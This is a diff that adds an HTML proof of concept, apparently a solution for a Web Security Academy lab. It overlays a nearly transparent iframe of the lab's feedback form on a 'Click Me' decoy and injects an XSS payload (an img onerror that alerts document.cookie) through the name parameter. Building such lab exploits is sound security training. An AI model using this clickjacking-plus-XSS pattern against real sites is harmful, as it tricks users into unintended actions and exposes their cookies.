@@ -1,0 +1,31 @@
+<DOCTYPE! HTML>
+<html>
+
+<head>
+  <style>
+    #target_website {
+      position:relative;
+      width:700px;
+      height:1000px;
+      opacity:0.1;
+      z-index:2;
+      }
+    #decoy_website {
+      position:absolute;
+      top: 910px;
+      left: 60px;
+      z-index:1;
+      }
+  </style>
+</head>
+
+<body>
+  <div id="decoy_website">
+	  Click Me
+  </div>
+  <iframe id="target_website" src="https://ac611f511f3c085c8085abef008100a3.web-security-academy.net/feedback?name=<img src='error' onerror='alert(document.cookie)'>&email=kiddie@test.com&subject=kiddie&message=kiddie">
+  </iframe>
+</body>
+
+<html>
+
